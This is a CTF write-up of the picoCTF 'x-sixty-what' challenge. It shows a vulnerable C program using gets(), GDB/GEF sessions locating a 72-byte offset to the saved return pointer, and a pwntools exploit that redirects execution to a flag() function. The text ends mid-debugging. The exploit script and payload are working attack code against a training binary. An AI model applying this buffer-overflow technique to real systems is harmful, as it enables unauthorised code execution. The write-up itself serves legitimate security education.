### Binary Exploitation

### Source: PICOCTF

### Description: Reminder! local exploits may not always work the same way remotely due to differences between machines.

### Basic File Checks

```
┌──(venv)─(mark㉿haxor)-[~/Desktop/CTF/Pico/x-sixty-what]
└─$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3267ee5914133fcf5ee026a4aa2b201324f02089, for GNU/Linux 3.2.0, not stripped
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/Desktop/CTF/Pico/x-sixty-what]
└─$ checksec vuln
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Desktop/CTF/Pico/x-sixty-what/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

This is a x64 binary. The protection enabled is only NX so we won't be able to inject shellcode to the stack

We're given the source code

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}
```

This is just like [BOF1](https://markuched13.github.io/posts/bof/bof1.html)

I'll follow the exact pattern. The only difference if am to get the offset manually is the registers cause in this case the register will be rip and rsp

Anyways lets go!!!

```
┌──(venv)─(mark㉿haxor)-[~/Desktop/CTF/Pico/x-sixty-what]
└─$ gdb -q vuln 
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.01ms using Python engine 3.11
Reading symbols from vuln...
(No debugging symbols found in vuln)
gef➤  disass vuln
Dump of assembler code for function vuln:
   0x00000000004012b2 <+0>:     endbr64 
   0x00000000004012b6 <+4>:     push   rbp
   0x00000000004012b7 <+5>:     mov    rbp,rsp
   0x00000000004012ba <+8>:     sub    rsp,0x40
   0x00000000004012be <+12>:    lea    rax,[rbp-0x40]
   0x00000000004012c2 <+16>:    mov    rdi,rax
   0x00000000004012c5 <+19>:    mov    eax,0x0
   0x00000000004012ca <+24>:    call   0x401100 <gets@plt>
   0x00000000004012cf <+29>:    nop
   0x00000000004012d0 <+30>:    leave  
   0x00000000004012d1 <+31>:    ret    
End of assembler dump.
gef➤  b *0x00000000004012d0
Breakpoint 1 at 0x4012d0
```

Run it & get the address our input is stored

```
gef➤  r
Starting program: /home/mark/Desktop/CTF/Pico/x-sixty-what/vuln 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc9000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to 64-bit. Give me a string that gets you the flag: 
pwnerhacker

Breakpoint 1, 0x00000000004012d0 in vuln ()


[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x007fffffffdde0  →  "pwnerhacker"
$rbx   : 0x007fffffffdf68  →  0x007fffffffe2c7  →  "/home/mark/Desktop/CTF/Pico/x-sixty-what/vuln"
$rcx   : 0x007ffff7f9ba80  →  0x00000000fbad2288
$rdx   : 0x1               
$rsp   : 0x007fffffffdde0  →  "pwnerhacker"
$rbp   : 0x007fffffffde20  →  0x007fffffffde50  →  0x0000000000000001
$rsi   : 0x1               
$rdi   : 0x007ffff7f9da20  →  0x0000000000000000
$rip   : 0x000000004012d0  →  <vuln+30> leave 
$r8    : 0x000000004052ac  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x1000            
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x007fffffffdf78  →  0x007fffffffe2f5  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffdde0│+0x0000: "pwnerhacker"  ← $rax, $rsp
0x007fffffffdde8│+0x0008: 0x007fff0072656b ("ker"?)
0x007fffffffddf0│+0x0010: 0x007ffff7f9c760  →  0x00000000fbad2887
0x007fffffffddf8│+0x0018: 0x007ffff7e40f19  →  <setvbuf+233> cmp rax, 0x1
0x007fffffffde00│+0x0020: 0x007fffffffdf68  →  0x007fffffffe2c7  →  "/home/mark/Desktop/CTF/Pico/x-sixty-what/vuln"
0x007fffffffde08│+0x0028: 0x007fffffffde50  →  0x0000000000000001
0x007fffffffde10│+0x0030: 0x0000000000000000
0x007fffffffde18│+0x0038: 0x007fffffffdf78  →  0x007fffffffe2f5  →  "COLORFGBG=15;0"
─────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4012c5 <vuln+19>        mov    eax, 0x0
     0x4012ca <vuln+24>        call   0x401100 <gets@plt>
     0x4012cf <vuln+29>        nop    
 →   0x4012d0 <vuln+30>        leave  
     0x4012d1 <vuln+31>        ret    
     0x4012d2 <main+0>         endbr64 
     0x4012d6 <main+4>         push   rbp
     0x4012d7 <main+5>         mov    rbp, rsp
     0x4012da <main+8>         sub    rsp, 0x20
─────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x4012d0 in vuln (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4012d0 → vuln()
[#1] 0x401338 → main()
────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  search-pattern pwnerhacker
[+] Searching 'pwnerhacker' in memory
[+] In '[heap]'(0x405000-0x426000), permission=rw-
  0x4052a0 - 0x4052ad  →   "pwnerhacker\n" 
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffdde0 - 0x7fffffffddeb  →   "pwnerhacker" 
gef➤  i f
Stack level 0, frame at 0x7fffffffde30:
 rip = 0x4012d0 in vuln; saved rip = 0x401338
 called by frame at 0x7fffffffde60
 Arglist at 0x7fffffffde20, args: 
 Locals at 0x7fffffffde20, Previous frame's sp is 0x7fffffffde30
 Saved registers:
  rbp at 0x7fffffffde20, rip at 0x7fffffffde28
gef➤ 
```

Doing the math we get the offset `0x7fffffffde28 - 0x7fffffffdde0 = 0x48`

I put together the solve script

```
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level='warn')
    p.sendlineafter(b':', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    #ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Binary filename
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(100))

# Start program
io = start()

padding = "A" * offset

# Build the payload
payload = flat([
    padding,
    elf.functions['flag']
    ])

# Send the payload
io.sendline(payload)

# Got Flag?
io.recv(100)
print(io.recv(100).decode())
#io.interactive()
io.close()
```

Running it locally

```
└─$ python2 exploit.py
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[DEBUG] core_pattern: 'core'
[DEBUG] core_uses_pid: False
[DEBUG] interpreter: ''
[DEBUG] Looking for QEMU corefile
[DEBUG] Trying corefile_path: '/home/mark/Desktop/CTF/Pico/x-sixty-what/qemu_vuln_*_17004.core'
[DEBUG] Looking for native corefile
[DEBUG] Checking for corefile (pattern)
[DEBUG] Trying corefile_path: '/home/mark/Desktop/CTF/Pico/x-sixty-what/core'
[+] Parsing corefile...: Done
[*] '/tmp/tmpWwyk68'
    Arch:      amd64-64-little
    RIP:       0x4012d1
    RSP:       0x7ffc788ab8f8
    Exe:       '/home/mark/Desktop/CTF/Pico/x-sixty-what/vuln' (0x400000)
    Fault:     0x6161617461616173
[+] Parsing corefile...: Done
[*] '/home/mark/Desktop/CTF/Pico/x-sixty-what/core.17004'
    Arch:      amd64-64-little
    RIP:       0x4012d1
    RSP:       0x7ffc788ab8f8
    Exe:       '/home/mark/Desktop/CTF/Pico/x-sixty-what/vuln' (0x400000)
    Fault:     0x6161617461616173
[DEBUG] core_pattern: 'core'
[DEBUG] core_uses_pid: False
[DEBUG] interpreter: ''
[DEBUG] Found core immediately: 'core.17004'
[+] Parsing corefile...: Done
[*] '/tmp/tmp8e78RM'
    Arch:      amd64-64-little
    RIP:       0x4012d1
    RSP:       0x7ffc788ab8f8
    Exe:       '/home/mark/Desktop/CTF/Pico/x-sixty-what/vuln' (0x400000)
    Fault:     0x6161617461616173
[!] located EIP/RIP offset at 72
[+] Starting local process './vuln': pid 17022
[DEBUG] Received 0x3d bytes:
    'Welcome to 64-bit. Give me a string that gets you the flag: \n'
[DEBUG] Sent 0x51 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000040  41 41 41 41  41 41 41 41  36 12 40 00  00 00 00 00  │AAAA│AAAA│6·@·│····│
    00000050  0a                                                  │·│
    00000051
[*] Switching to interactive mode
 
[*] Got EOF while reading in interactive
$ 
[DEBUG] Sent 0x1 bytes:
    '\n' * 0x1
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 17022)
[*] Got EOF while sending in interactive
```

It doesn't work, but its right 🤔

So from the description we know that our local exploit may not work

I'll try to debug it first from our local machine

But i edited the code to write out the payload to a file which i'll use to debug the binary

```
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Binary filename
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


# Pass in pattern_size, get back EIP/RIP offset
offset = 72

# Start program
io = start()

padding = "A" * offset

# Build the payload
payload = flat([
    padding,
    elf.functions['flag']
    ])

write('payload', payload)

# Send the payload
io.sendlineafter(b':', payload)

# Got Flag?
io.recv(100)
print(io.recv(100).decode())
#io.interactive()
io.close()
```

Now i run it

```
─$ python2 exploit.py 
[+] Starting local process './vuln': pid 19719
[*] Switching to interactive mode
 
[*] Got EOF while reading in interactive
$ 
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 19719)
[*] Got EOF while sending in interactive
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/Desktop/CTF/Pico/x-sixty-what]
└─$ ls payload 
payload
                                                                                                        
┌──(venv)─(mark㉿haxor)-[~/Desktop/CTF/Pico/x-sixty-what]
└─$ cat payload 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6@                                                                                             
```

With this i will run the binary on gdb set the breakpoint at the leave call in vuln() the input will then be the payload file

```
└─$ gdb -q vuln 
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.11
Reading symbols from vuln...
(No debugging symbols found in vuln)
gef➤  disass vuln
Dump of assembler code for function vuln:
   0x00000000004012b2 <+0>:     endbr64 
   0x00000000004012b6 <+4>:     push   rbp
   0x00000000004012b7 <+5>:     mov    rbp,rsp
   0x00000000004012ba <+8>:     sub    rsp,0x40
   0x00000000004012be <+12>:    lea    rax,[rbp-0x40]
   0x00000000004012c2 <+16>:    mov    rdi,rax
   0x00000000004012c5 <+19>:    mov    eax,0x0
   0x00000000004012ca <+24>:    call   0x401100 <gets@plt>
   0x00000000004012cf <+29>:    nop
   0x00000000004012d0 <+30>:    leave  
   0x00000000004012d1 <+31>:    ret    
End of assembler dump.
gef➤  b *0x00000000004012d0
Breakpoint 1 at 0x4012d0
gef➤  r < payload 
Starting program: /home/mark/Desktop/CTF/Pico/x-sixty-what/vuln < payload
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc9000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to 64-bit. Give me a string that gets you the flag: 

Breakpoint 1, 0x00000000004012d0 in vuln ()





















[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x007fffffffdde0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbx   : 0x007fffffffdf68  →  0x007fffffffe2c7  →  "/home/mark/Desktop/CTF/Pico/x-sixty-what/vuln"
$rcx   : 0x007ffff7f9ba80  →  0x00000000fbad2098
$rdx   : 0x1               
$rsp   : 0x007fffffffdde0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbp   : 0x007fffffffde20  →  0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x1               
$rdi   : 0x007ffff7f9da20  →  0x0000000000000000
$rip   : 0x000000004012d0  →  <vuln+30> leave 
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x1000            
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x007fffffffdf78  →  0x007fffffffe2f5  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffdde0│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"      ← $rax, $rsp
0x007fffffffdde8│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffddf0│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffddf8│+0x0018: 0x4141414141414141
0x007fffffffde00│+0x0020: 0x4141414141414141
0x007fffffffde08│+0x0028: 0x4141414141414141
0x007fffffffde10│+0x0030: 0x4141414141414141
0x007fffffffde18│+0x0038: 0x4141414141414141
─────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4012c5 <vuln+19>        mov    eax, 0x0
     0x4012ca <vuln+24>        call   0x401100 <gets@plt>
     0x4012cf <vuln+29>        nop    
 →   0x4012d0 <vuln+30>        leave  
     0x4012d1 <vuln+31>        ret    
     0x4012d2 <main+0>         endbr64 
     0x4012d6 <main+4>         push   rbp
     0x4012d7 <main+5>         mov    rbp, rsp
     0x4012da <main+8>         sub    rsp, 0x20
─────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x4012d0 in vuln (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4012d0 → vuln()
[#1] 0x401236 → frame_dummy()
[#2] 0x7fffffffdf00 → rcl BYTE PTR [rdx], cl
────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

Now i'll go to the next call which is ret

```
gef➤  nexti
0x00000000004012d1 in vuln ()



[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x007fffffffdde0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbx   : 0x007fffffffdf68  →  0x007fffffffe2c7  →  "/home/mark/Desktop/CTF/Pico/x-sixty-what/vuln"
$rcx   : 0x007ffff7f9ba80  →  0x00000000fbad2098
$rdx   : 0x1               
$rsp   : 0x007fffffffde28  →  0x00000000401236  →  <flag+0> endbr64 
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x1               
$rdi   : 0x007ffff7f9da20  →  0x0000000000000000
$rip   : 0x000000004012d1  →  <vuln+31> ret 
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x1000            
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x007fffffffdf78  →  0x007fffffffe2f5  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffde28│+0x0000: 0x00000000401236  →  <flag+0> endbr64          ← $rsp
0x007fffffffde30│+0x0008: 0x007fffffffdf00  →  0x000000004012d2  →  <main+0> endbr64 
0x007fffffffde38│+0x0010: 0x00000001f7fe6e10
0x007fffffffde40│+0x0018: 0x0000000000000000
0x007fffffffde48│+0x0020: 0x000003e8f7ffdad0
0x007fffffffde50│+0x0028: 0x0000000000000001
0x007fffffffde58│+0x0030: 0x007ffff7df018a  →  <__libc_start_call_main+122> mov edi, eax
0x007fffffffde60│+0x0038: 0x007fffffffdf50  →  0x007fffffffdf58  →  0x00000000000038 ("8"?)
─────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4012ca <vuln+24>        call   0x401100 <gets@plt>
     0x4012cf <vuln+29>        nop    
     0x4012d0 <vuln+30>        leave  
 →   0x4012d1 <vuln+31>        ret    
   ↳    0x401236 <flag+0>         endbr64 
        0x40123a <flag+4>         push   rbp
        0x40123b <flag+5>         mov    rbp, rsp
        0x40123e <flag+8>         sub    rsp, 0x50
        0x401242 <flag+12>        lea    rsi, [rip+0xdbf]        # 0x402008
        0x401249 <flag+19>        lea    rdi, [rip+0xdba]        # 0x40200a
─────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x4012d1 in vuln (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4012d1 → vuln()
[#1] 0x401236 → frame_dummy()
[#2] 0x7fffffffdf00 → rcl BYTE PTR [rdx], cl
────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  disass vuln
Dump of assembler code for function vuln:
   0x00000000004012b2 <+0>:     endbr64 
   0x00000000004012b6 <+4>:     push   rbp
   0x00000000004012b7 <+5>:     mov    rbp,rsp
   0x00000000004012ba <+8>:     sub    rsp,0x40
   0x00000000004012be <+12>:    lea    rax,[rbp-0x40]
   0x00000000004012c2 <+16>:    mov    rdi,rax
   0x00000000004012c5 <+19>:    mov    eax,0x0
   0x00000000004012ca <+24>:    call   0x401100 <gets@plt>
   0x00000000004012cf <+29>:    nop
   0x00000000004012d0 <+30>:    leave  
=> 0x00000000004012d1 <+31>:    ret    
End of assembler dump.
gef➤
```

We are currently at the ret call of vuln, i'll move to the next func call 

```
gef➤  nexti
0x0000000000401236 in flag ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x007fffffffdde0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbx   : 0x007fffffffdf68  →  0x007fffffffe2c7  →  "/home/mark/Desktop/CTF/Pico/x-sixty-what/vuln"
$rcx   : 0x007ffff7f9ba80  →  0x00000000fbad2098
$rdx   : 0x1               
$rsp   : 0x007fffffffde30  →  0x007fffffffdf00  →  0x000000004012d2  →  <main+0> endbr64 
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x1               
$rdi   : 0x007ffff7f9da20  →  0x0000000000000000
$rip   : 0x00000000401236  →  <flag+0> endbr64 
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x1000            
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x007fffffffdf78  →  0x007fffffffe2f5  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffde30│+0x0000: 0x007fffffffdf00  →  0x000000004012d2  →  <main+0> endbr64     ← $rsp
0x007fffffffde38│+0x0008: 0x00000001f7fe6e10
0x007fffffffde40│+0x0010: 0x0000000000000000
0x007fffffffde48│+0x0018: 0x000003e8f7ffdad0
0x007fffffffde50│+0x0020: 0x0000000000000001
0x007fffffffde58│+0x0028: 0x007ffff7df018a  →  <__libc_start_call_main+122> mov edi, eax
0x007fffffffde60│+0x0030: 0x007fffffffdf50  →  0x007fffffffdf58  →  0x00000000000038 ("8"?)
0x007fffffffde68│+0x0038: 0x000000004012d2  →  <main+0> endbr64 
─────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40122c <__do_global_dtors_aux+44> nop    DWORD PTR [rax+0x0]
     0x401230 <frame_dummy+0>  endbr64 
     0x401234 <frame_dummy+4>  jmp    0x4011c0 <register_tm_clones>
 →   0x401236 <flag+0>         endbr64 
     0x40123a <flag+4>         push   rbp
     0x40123b <flag+5>         mov    rbp, rsp
     0x40123e <flag+8>         sub    rsp, 0x50
     0x401242 <flag+12>        lea    rsi, [rip+0xdbf]        # 0x402008
     0x401249 <flag+19>        lea    rdi, [rip+0xdba]        # 0x40200a
─────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x401236 in flag (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401236 → flag()
[#1] 0x7fffffffdf00 → rcl BYTE PTR [rdx], cl
────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  disass flag
Dump of assembler code for function flag:
=> 0x0000000000401236 <+0>:     endbr64 
   0x000000000040123a <+4>:     push   rbp
   0x000000000040123b <+5>:     mov    rbp,rsp
   0x000000000040123e <+8>:     sub    rsp,0x50
   0x0000000000401242 <+12>:    lea    rsi,[rip+0xdbf]        # 0x402008
   0x0000000000401249 <+19>:    lea    rdi,[rip+0xdba]        # 0x40200a
   0x0000000000401250 <+26>:    call   0x401130 <fopen@plt>
   0x0000000000401255 <+31>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401259 <+35>:    cmp    QWORD PTR [rbp-0x8],0x0
   0x000000000040125e <+40>:    jne    0x401289 <flag+83>
   0x0000000000401260 <+42>:    lea    rdx,[rip+0xdac]        # 0x402013
   0x0000000000401267 <+49>:    lea    rsi,[rip+0xdba]        # 0x402028
   0x000000000040126e <+56>:    lea    rdi,[rip+0xde8]        # 0x40205d
   0x0000000000401275 <+63>:    mov    eax,0x0
   0x000000000040127a <+68>:    call   0x4010e0 <printf@plt>
   0x000000000040127f <+73>:    mov    edi,0x0
   0x0000000000401284 <+78>:    call   0x401140 <exit@plt>
   0x0000000000401289 <+83>:    mov    rdx,QWORD PTR [rbp-0x8]
   0x000000000040128d <+87>:    lea    rax,[rbp-0x50]
   0x0000000000401291 <+91>:    mov    esi,0x40
   0x0000000000401296 <+96>:    mov    rdi,rax
   0x0000000000401299 <+99>:    call   0x4010f0 <fgets@plt>
   0x000000000040129e <+104>:   lea    rax,[rbp-0x50]
   0x00000000004012a2 <+108>:   mov    rdi,rax
   0x00000000004012a5 <+111>:   mov    eax,0x0
   0x00000000004012aa <+116>:   call   0x4010e0 <printf@plt>
   0x00000000004012af <+121>:   nop
   0x00000000004012b0 <+122>:   leave  
   0x00000000004012b1 <+123>:   ret    
End of assembler dump.
gef➤
```

With this we know that our rip returned to the flag function which is suppose to print the flag out

I'll keep on moving to the next call till i get to `  0x0000000000401250 <+26>:    call   0x401130 <fopen@plt>`

```
gef➤  
0x0000000000401250 in flag ()




[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x007fffffffdde0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbx   : 0x007fffffffdf68  →  0x007fffffffe2c7  →  "/home/mark/Desktop/CTF/Pico/x-sixty-what/vuln"
$rcx   : 0x007ffff7f9ba80  →  0x00000000fbad2098
$rdx   : 0x1               
$rsp   : 0x007fffffffddd8  →  0x000000004012cf  →  <vuln+29> nop 
$rbp   : 0x007fffffffde28  →  "AAAAAAAA"
$rsi   : 0x00000000402008  →  0x742e67616c660072 ("r"?)
$rdi   : 0x0000000040200a  →  "flag.txt"
$rip   : 0x00000000401250  →  <flag+26> call 0x401130 <fopen@plt>
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x1000            
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x007fffffffdf78  →  0x007fffffffe2f5  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffddd8│+0x0000: 0x000000004012cf  →  <vuln+29> nop     ← $rsp
0x007fffffffdde0│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"      ← $rax
0x007fffffffdde8│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffddf0│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffddf8│+0x0020: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffde00│+0x0028: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0x007fffffffde08│+0x0030: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
0x007fffffffde10│+0x0038: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
─────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40123e <flag+8>         sub    rsp, 0x50
     0x401242 <flag+12>        lea    rsi, [rip+0xdbf]        # 0x402008
     0x401249 <flag+19>        lea    rdi, [rip+0xdba]        # 0x40200a
 →   0x401250 <flag+26>        call   0x401130 <fopen@plt>
   ↳    0x401130 <fopen@plt+0>    endbr64 
        0x401134 <fopen@plt+4>    bnd    jmp QWORD PTR [rip+0x2f15]        # 0x404050 <fopen@got.plt>
        0x40113b <fopen@plt+11>   nop    DWORD PTR [rax+rax*1+0x0]
        0x401140 <exit@plt+0>     endbr64 
        0x401144 <exit@plt+4>     bnd    jmp QWORD PTR [rip+0x2f0d]        # 0x404058 <exit@got.plt>
        0x40114b <exit@plt+11>    nop    DWORD PTR [rax+rax*1+0x0]
─────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
fopen@plt (
   $rdi = 0x0000000040200a → "flag.txt",
   $rsi = 0x00000000402008 → 0x742e67616c660072 ("r"?),
   $rdx = 0x00000000000001
)
─────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x401250 in flag (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401250 → flag()
[#1] 0x7fffffffdf00 → rcl BYTE PTR [rdx], cl
────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  disass flag
Dump of assembler code for function flag:
   0x0000000000401236 <+0>:     endbr64 
   0x000000000040123a <+4>:     push   rbp
   0x000000000040123b <+5>:     mov    rbp,rsp
   0x000000000040123e <+8>:     sub    rsp,0x50
   0x0000000000401242 <+12>:    lea    rsi,[rip+0xdbf]        # 0x402008
   0x0000000000401249 <+19>:    lea    rdi,[rip+0xdba]        # 0x40200a
=> 0x0000000000401250 <+26>:    call   0x401130 <fopen@plt>
